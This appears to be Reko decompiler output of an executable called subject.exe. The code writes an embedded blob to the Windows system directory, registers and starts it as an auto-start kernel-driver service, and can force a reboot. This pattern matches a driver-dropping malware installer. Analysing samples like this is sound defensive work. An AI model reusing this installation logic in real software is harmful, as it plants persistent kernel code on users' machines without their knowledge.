// subject_UPX0.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00401000: Register byte fn00401000(Register (ptr32 Eq_3) ecx, Stack Eq_4 dwArg04)
// Called from:
//      fn004010C7
byte fn00401000(CHAR * ecx, Eq_4 dwArg04)
{
	Eq_5 tLoc08;
	word32 eax_85;
	tLoc08 = (Eq_5) ecx;
	Eq_11 eax_29 = CreateFileA(dwArg04, 0x40000000, 0x07, null, 0x02, 0x80, null);
	word24 eax_24_8_86 = SLICE(eax_29, word24, 8);
	if (eax_29 == (void *) ~0x00)
		eax_85 = SEQ(eax_24_8_86, 0x00);
	else
	{
		WriteFile(eax_29, &g_v403010, g_t403008, &tLoc08, null);
		eax_85 = SEQ(SLICE(CloseHandle(eax_29), word24, 8), 0x01);
	}
	return (byte) eax_85;
}

// 0040104F: Register byte fn0040104F()
// Called from:
//      fn004010C7
byte fn0040104F()
{
	Eq_56 tLoc20;
	Eq_57 tLoc10;
	Eq_11 tLoc08;
	Eq_59 eax_107;
	tLoc08 = (Eq_11) 0x00;
	Eq_44 eax_22 = OpenProcessToken(GetCurrentProcess(), 0x000200E0, &tLoc08);
	word24 eax_24_8_108 = SLICE(eax_22, word24, 8);
	if (eax_22 != 0x00)
	{
		Eq_44 eax_35 = LookupPrivilegeValueA(0x00, 0x00402060, &tLoc10);
		eax_24_8_108 = SLICE(eax_35, word24, 8);
		if (eax_35 != 0x00)
		{
			tLoc20.Privileges[0].Luid.LowPart = tLoc10.LowPart;
			tLoc20.t0008 = (Eq_108) tLoc10.HighPart;
			Eq_11 v14_56 = tLoc08;
			tLoc20.PrivilegeCount = (DWORD) 0x01;
			tLoc20.dw000C = 0x02;
			AdjustTokenPrivileges(v14_56, 0x00, &tLoc20, 0x10, null, null);
			eax_107 = !GetLastError();
			return (byte) eax_107;
		}
	}
	eax_107 = SEQ(eax_24_8_108, 0x00);
	return (byte) eax_107;
}

// 004010C7: void fn004010C7()
void fn004010C7()
{
	Eq_146 tLoc0240;
	Eq_146 tLoc0138;
	Eq_148 tLoc34;
	Eq_149 tLoc18;
	if (GetSystemDirectoryA(&tLoc0240, 0x0104) == 0x00 || SetCurrentDirectoryA(&tLoc0240) == 0x00)
		return;
	Eq_11 eax_46 = OpenEventA(0x00100002, 0x00, 0x00402090);
	if (eax_46 != null)
	{
		SetEvent(eax_46);
		CloseHandle(eax_46);
	}
	GetFullPathNameA(0x00402080, 0x0104, &tLoc0138, &tLoc18);
	byte bLoc05_296 = 0x00;
	Eq_191 eax_87 = OpenSCManagerA(0x00, 0x00, 0x40000000);
	if (eax_87 == null)
	{
l00401210:
		if (eax_46 == null && (bLoc05_296 != 0x00 && fn0040104F() != 0x00))
			ExitWindowsEx(0x12, 0x00);
		return;
	}
	Eq_191 eax_121 = CreateServiceA(eax_87, 0x00402074, 0x00402074, 0x000F01FF, 0x01, 0x02, 0x01, &tLoc0138, 0x00, null, 0x00, 0x00, 0x00);
	Eq_191 dwLoc0C_314 = eax_121;
	if (eax_121 == null)
	{
		if (GetLastError() == 0x0431)
		{
			Eq_191 eax_136 = OpenServiceA(eax_87, 0x00402074, 0x000F01FF);
			dwLoc0C_314 = eax_136;
			if (eax_136 == null)
				goto l00401207;
			ControlService(eax_136, 0x01, &tLoc34);
			ChangeServiceConfigA(eax_136, 0x01, 0x02, 0x01, &tLoc0138, 0x00, null, 0x00, 0x00, 0x00, 0x00402074);
			bLoc05_296 = 0x01;
		}
		if (dwLoc0C_314 == null)
			goto l00401207;
		if (fn00401000(&tLoc0138, &tLoc0138) == 0x00)
		{
l004011F9:
			if (dwLoc0C_314 != null)
				CloseServiceHandle(dwLoc0C_314);
l00401207:
			CloseServiceHandle(eax_87);
			goto l00401210;
		}
	}
	StartServiceA(dwLoc0C_314, 0x00, null);
	goto l004011F9;
}

Eq_5 g_t403008 = 0x9F00; // 00403008
void g_v403010 = ??void??; // 00403010
